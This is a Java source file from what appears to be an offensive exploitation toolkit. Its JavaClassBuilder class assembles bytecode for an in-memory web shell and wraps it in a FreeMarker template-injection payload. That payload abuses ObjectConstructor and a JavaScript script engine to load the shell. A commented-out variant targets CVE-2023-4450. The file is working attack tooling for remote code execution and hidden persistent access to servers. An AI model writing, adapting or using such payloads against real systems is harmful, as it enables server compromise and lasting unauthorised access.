package com.ppp;

import com.ppp.annotation.JavaClassEnhance;
import com.ppp.annotation.JavaClassHelperType;
import com.ppp.utils.PayloadUtils;
import com.ppp.utils.Reflections;
import com.ppp.utils.maker.ClassUtils;
import com.ppp.utils.maker.CryptoUtils;

import java.io.FileInputStream;
import java.util.Arrays;
import java.util.List;

/**
 * @author Whoopsunix
 * 内存马生成
 */

public class JavaClassBuilder {
    private static String schedulerPackageName = "com.ppp.scheduler";

    public static byte[] build(JavaClassHelper javaClassHelper) throws Exception {
        String javaClassHelperType = javaClassHelper.getJavaClassHelperType();
        String javaClassFilePath = javaClassHelper.getJavaClassFilePath();
        byte[] bytes = new byte[0];

        if (javaClassHelperType.equals(JavaClassHelperType.Custom)) {
            try {
                Printer.yellowInfo("load JavaClass from file: " + javaClassFilePath);
                FileInputStream fileInputStream = new FileInputStream(javaClassFilePath);
                bytes = new byte[fileInputStream.available()];
                fileInputStream.read(bytes);
                fileInputStream.close();
                Printer.yellowInfo("Custom JavaClass: " + new String(bytes));
                byte[] expectedPrefix = {121, 118, 54, 54};
                if (Arrays.equals(Arrays.copyOfRange(bytes, 0, expectedPrefix.length), expectedPrefix)) {
                    bytes = CryptoUtils.base64decoder(new String(bytes));
                }

            } catch (Exception e) {
                Printer.error("File read error");
            }
        } else {
            Class builderClass = null;
            List<Class<?>> schedulerClasses = ClassUtils.getClasses(schedulerPackageName);
            for (Class<?> clazz : schedulerClasses) {
                JavaClassHelperType javaClassHelperTypeAnnotation = clazz.getAnnotation(JavaClassHelperType.class);
                if (javaClassHelperTypeAnnotation == null) continue;

                if (javaClassHelperTypeAnnotation.value().equals(javaClassHelperType)) {
                    builderClass = clazz;
                    break;
                }
            }

            bytes = (byte[]) Reflections.invokeMethod(builderClass.newInstance(), "build", javaClassHelper);
        }

        advance(javaClassHelper, bytes);
        return bytes;

    }

    /**
     * 增强
     */
    public static void advance(JavaClassHelper javaClassHelper, byte[] bytes) throws Exception {
        JavaClassEnhance javaClassEnhance = javaClassHelper.getJavaClassEnhance();
        switch (javaClassEnhance) {
            case Default:
            default:
                break;
            case FreeMarker:
                String codeClassName = null;
                // 内存马
                if (javaClassHelper.getJavaClassHelperType().equals(JavaClassHelperType.MemShell)) {
                    codeClassName = javaClassHelper.getLoaderClassName();
                } else {
                    codeClassName = javaClassHelper.getCLASSNAME();
                }

                // todo
                String freeMakerPayload = String.format("{\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval('%s')}", PayloadUtils.loadByScriptEngine(CryptoUtils.base64encoder(bytes), codeClassName));

                // CVE-2023-4450
//                String codec = PayloadUtils.loadByScriptEngine(CryptoUtils.base64encoder(bytes), codeClassName).replaceAll("\"", "\\\\\"");
//                String freeMakerPayload = String.format("{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval('%s#{1};')}\",\"dbSource\":\"\",\"type\":\"0\"}", codec);

                Printer.print(freeMakerPayload);
        }
    }


}
